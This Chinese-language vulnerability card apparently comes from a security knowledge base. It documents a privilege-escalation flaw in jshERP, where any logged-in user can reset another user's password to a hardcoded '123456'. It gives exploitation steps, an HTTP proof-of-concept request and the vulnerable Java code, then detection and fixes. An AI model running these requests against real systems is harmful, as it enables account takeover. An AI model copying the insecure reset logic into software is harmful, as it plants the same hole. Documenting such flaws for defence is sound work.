---
id: web-generic-auth-uid-resetpwd-hardcoded-default-password
title: 登录用户按 uid 重置任意用户密码（硬编码默认口令）
type: scenario
domain: web
path: web/generic/auth
technique: uid-resetpwd-hardcoded-default-password
aliases:
- resetPwd 越权
- 按 uid 重置密码
- 任意用户密码重置
- 默认口令 123456
- 硬编码初始密码
- jshERP resetPwd
tags:
- web
- auth
- idor
- password-reset
- account-takeover
- hardcoded-credential
- multi-tenant
- vertical-privilege-escalation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:30:26+08:00'
  notes: 已对照原文与19张图核对；UserController.resetPwd取请求id、硬编码123456+MD5、UserService仅拦loginName=admin、updateByPrimaryKeySelective均与截图一致；属登录后IDOR+弱默认口令接管，多租户跨租户需租户过滤缺失（卡内已注明）；未复跑
---

## 一句话结论

已登录的低权限用户调用 `/user/resetPwd` 时，后端直接从请求 JSON 取目标 `id`，把该用户密码重置为源码中写死的 `123456`（MD5 后入库），全程不校验调用者是否为管理员、也不校验目标用户是否属于调用者；因此任意登录用户都能接管同租户内除字面量 `admin` 外的任意账号，若租户过滤可被绕过则扩大到跨租户。

## 原理

- 控制器 `resetPwd(@RequestBody JSONObject jsonObject, HttpServletRequest request)` 只从请求体读 `id`，不读会话中的当前用户角色，也不把目标用户与当前会话用户/租户做归属比较；写死的 `password = "123456"` 经 `Tools.md5Encryp` 处理后交给 `userService.resetPwd(md5Pwd, id)`。
- 服务层 `resetPwd(String md5Pwd, Long id)` 先 `getUser(id)` 取目标用户，仅判断 `"admin".equals(loginName)` 时拒绝，其余直接构造 `User` 并 `updateByPrimaryKeySelective` 更新密码。也就是说，唯一的保护是“目标登录名不能是 admin”，没有“调用者必须是管理员/租户管理员”，也没有“目标必须属于当前租户”。
- 危害成立的原因有三点叠加：默认密码是公开可猜的弱口令；重置后攻击者无需知道原密码即可登录；目标 id 是连续主键且用户列表接口会返回 `id`/`userName`，便于枚举。
- 在多租户系统中，正确模型应是“租户 ID + 用户 ID”维度，且重置他人密码需要租户管理员权限；只按主键定位属于典型的对象级/功能级授权缺失（IDOR + 垂直越权）。
- 租户插件（如 MyBatis-Plus `TenantLineHandler`）若在 `UPDATE` 时自动追加 `tenant_id`，默认只能命中同租户用户；一旦租户条件缺失或可被请求头绕过，同一缺陷即可跨租户接管账号。

## 触发条件

- 攻击者持有任意可登录的低权限账号（普通租户用户即可）。
- 目标系统存在按 `id` 重置密码且使用固定默认口令的接口（本例为 `/jshERP-boot/user/resetPwd`，请求体 `{"id":<目标用户主键>}`）。
- 服务端未校验调用者角色、未校验目标用户归属，且未要求原密码/短信校验。
- 目标账号 `loginName` 不等于字面量 `admin`（该实现只拦这一个账号）。
- 目标 id 可知或可枚举（用户列表、接口文档、连续主键）。

## 利用步骤

1. 用低权限账号登录，取得会话令牌（jshERP 为 `X-Access-Token: <session>_<tenantId>`）。
2. 枚举目标用户 id：调用用户列表接口（如 `GET /user/getUserList`）读取返回的 `id` 与 `userName`，或按连续主键猜测。
3. 向 `/user/resetPwd` 发送 `{"id": <目标id>}`；响应 `code=200` 表示更新成功。
4. 用目标账号 + `123456` 登录，确认接管；若目标是租户管理员/高权限业务账号，即完成纵向提权。
5. 若租户过滤可被绕过（缺失/伪造租户头、路径解析绕过认证过滤器），把同一步骤用于其他租户的 id，完成跨租户接管。

## PoC

```http
POST /jshERP-boot/user/resetPwd HTTP/1.1
Host: target:9999
X-Access-Token: <低权限会话>_<tenantId>
Content-Type: application/json

{"id": 132}
```

```text
# 预期响应：{"code":200,"data":{"message":"操作成功"}}
# 随后以目标账号 + 123456 登录
```

```java
// 对应后端关键逻辑（示意）
public String resetPwd(@RequestBody JSONObject jsonObject, HttpServletRequest request) {
    long id = jsonObject.getLong("id");          // 目标 id 完全由请求控制
    String password = "123456";                  // 硬编码默认口令
    String md5Pwd = Tools.md5Encryp(password);   // 无盐 MD5
    int update = userService.resetPwd(md5Pwd, id);
    ...
}

public int resetPwd(String md5Pwd, Long id) throws Exception {
    User u = getUser(id);
    if ("admin".equals(u.getLoginName())) {      // 只拦字面量 admin
        logger.info("禁止重置超管密码");
    } else {
        User user = new User();
        user.setId(id);
        user.setPassword(md5Pwd);
        result = userMapper.updateByPrimaryKeySelective(user);
    }
    return result;
}
```

## 变体与关联

- 变体：默认口令换成 `888888`、`admin123`、手机号后六位等；或重置后返回明文口令。
- 变体：目标定位参数改为 `username`、`loginName`、`uid`、`ids` 批量数组；批量重置可一次性接管大量账号。
- 变体：改密接口要求 `current-password`，但校验的是目标用户且无速率限制，可先爆破再改密（见关联卡）。
- 关联：[[web-generic-auth-authenticated-change-password-idor]]（登录后按 username 改他人密码的同类越权）、[[web-generic-auth-multitenant-tenant-header-missing-superadmin]]（jshERP 同一服务的跨租户版本，前置条件是删租户头/绕过过滤器）、[[web-generic-auth-swagger-unauth-user-management]]（文档暴露辅助枚举用户与接口）。
- 边界：调用者必须是已登录用户；目标为字面量 `admin` 时被拒；若服务端补充了角色/归属校验、要求原密码或二次验证、或租户条件在 SQL 中强制生效，则同租户以外的利用不成立。

## 检测与防御

- 检测：同一会话在短时间内对多个不同 `id` 调用 `resetPwd`；重置后立即用默认口令登录；响应 200 的重置请求与登录成功事件相邻；审计日志中出现“非管理员执行密码重置”。
- 修复：从会话取当前用户与租户，校验调用者具备管理员/租户管理员角色；校验目标用户 `tenant_id == session.tenant_id`；禁止重置同级或更高权限账号；重置接口要求原密码或管理员二次确认。
- 加固：移除硬编码默认口令，改为随机一次性令牌/首次登录强制改密；口令使用 bcrypt/argon2 加盐哈希而非裸 MD5；对重置操作限流并记录操作者、目标、来源 IP。
